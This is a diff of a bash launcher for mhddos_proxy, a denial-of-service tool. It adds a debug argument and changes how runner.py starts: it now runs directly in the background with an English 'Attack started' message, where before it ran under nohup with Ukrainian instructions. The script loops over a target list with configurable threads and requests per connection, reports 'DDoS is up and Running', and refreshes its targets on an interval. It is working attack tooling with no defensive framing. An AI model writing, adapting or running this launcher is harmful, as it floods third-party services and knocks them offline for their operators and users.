@@ -19,6 +19,7 @@ threads="${1:-1000}"
 threads="-t $threads"
 rpc="${2:-200}"
 rpc="--rpc $rpc"
+debug="${3:-}"
 proxy_interval="-p 600"
 
 #Just in case kill previous copy of mhddos_proxy
@@ -50,9 +51,8 @@ do
             echo "$cmd_line $proxy_interval $threads $rpc"
             
             cd ~/mhddos_proxy
-            nohup python3 $cmd_line $threads $proxy_interval $rpc </dev/null &>/dev/null &
-            echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
-            echo -e "\nЯкщо цікаво можете у іншій вкладці подивитися через: \n ps aux | grep runner.py , що там запущенно\nАбо скачати: \n sudo apt install --upgrade htop \n, та у реальному часі дивития через: \n htop"
+            python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
+            echo -e "Attack started. Wait a few minutes for output"
    done
    
    echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
